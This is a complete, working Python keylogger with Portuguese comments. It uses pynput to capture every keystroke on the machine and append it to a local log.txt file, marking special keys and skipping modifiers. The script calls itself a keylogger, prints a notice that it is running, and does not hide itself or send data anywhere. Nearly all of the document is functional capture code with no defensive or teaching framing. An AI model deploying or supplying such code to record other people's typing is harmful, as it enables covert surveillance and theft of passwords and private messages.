from pynput import keyboard

# Conjunto de teclas que não queremos registrar para o log ficar limpo
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # Tenta registrar teclas alfanuméricas (letras, números)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Lida com teclas especiais (Enter, Espaço, etc.)
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")  # Quebra de linha para cada 'Enter'
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
                # Opcional: retornar False aqui para parar o logger ao apertar ESC
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key}] ")

# Inicia o monitoramento em segundo plano
print("Keylogger em execução... (Pressione Ctrl+C no terminal para parar)")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
